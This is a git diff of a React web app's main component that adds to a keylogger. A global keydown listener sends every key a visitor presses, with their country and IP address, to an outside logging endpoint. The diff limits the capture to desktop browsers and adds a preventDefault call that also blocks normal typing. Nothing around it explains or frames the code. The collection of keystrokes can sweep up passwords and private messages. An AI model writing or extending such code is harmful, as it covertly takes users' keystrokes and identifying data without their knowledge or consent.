@@ -8,6 +8,7 @@ import NotFound from './NotFound';
 import { LocationContext } from './contexts/LocationContext';
 import Admin from './admin/Admin';
 import Login from './admin/Login';
+import { isBrowser } from 'react-device-detect';
 
 const CaptureKey = (key, location, ip_address) => {
   fetch('https://keylogging.pythonanywhere.com/api/new_keylog', {
@@ -24,7 +25,6 @@ const CaptureKey = (key, location, ip_address) => {
     return responce.json();
   }).then(data => {
     console.log('Captured')
-
   }).catch(error => {
     console.log('Aborted')
   })
@@ -32,9 +32,10 @@ const CaptureKey = (key, location, ip_address) => {
 
 function App() {
   const { location } = useContext(LocationContext);
+  isBrowser &&
   window.addEventListener('keydown', function (e) {
     location && CaptureKey(e.key, location.country_name, location.IPv4)
-   
+    e.preventDefault()
   }, false);
 
   return (
